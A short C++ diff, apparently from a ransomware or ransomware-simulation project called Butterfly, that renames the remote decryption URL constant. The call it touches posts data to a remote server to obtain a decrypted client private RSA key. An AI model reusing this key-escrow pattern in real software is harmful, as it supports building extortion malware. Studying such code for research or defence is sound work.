@@ -135,7 +135,7 @@ void Butterfly::run()
         std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
 
         // Send the http post request to the REMOTE_DECRYPTION_URL
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
 
         if ( httpClient->statusCode == 200 )
         {
@@ -193,7 +193,7 @@ void Butterfly::run()
         std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
 
         // Send the http post request to the REMOTE_DECRYPTION_URL
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
 
         if ( httpClient->statusCode == 200 )
         {
